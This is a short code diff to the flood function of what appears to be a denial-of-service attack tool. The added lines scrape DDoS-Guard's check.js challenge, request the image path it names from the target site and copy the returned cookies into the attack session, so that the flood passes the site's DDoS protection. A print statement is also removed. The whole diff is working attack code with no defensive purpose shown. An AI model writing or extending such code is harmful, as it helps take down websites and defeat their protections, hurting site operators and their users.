@@ -62,8 +62,17 @@ def flood(attack_id, url, stoptime) -> None:
             except Exception:
                 pass
         
+        try:
+            with session.get("https://check.ddos-guard.net/check.js", headers=headers, verify=False) as req:
+                src = re.search(r"new Image\(\).src = '(.+?)';", req.text)[1]
+
+                req = session.get(f'{urlparse(url).scheme}://{urlparse(url).netloc}{src}')
+                for key, value in req.cookies.items():
+                    Core.session.cookies.set_cookie(requests.cookies.create_cookie(key, value))
+        except Exception:
+            pass
+
         Core.ddosguard_cookies_grabbed = True
-        print('[DDOS-GUARD] Got cookies')
 
     while time.time() < stoptime and not Core.killattack:
         if not Core.attackrunning:
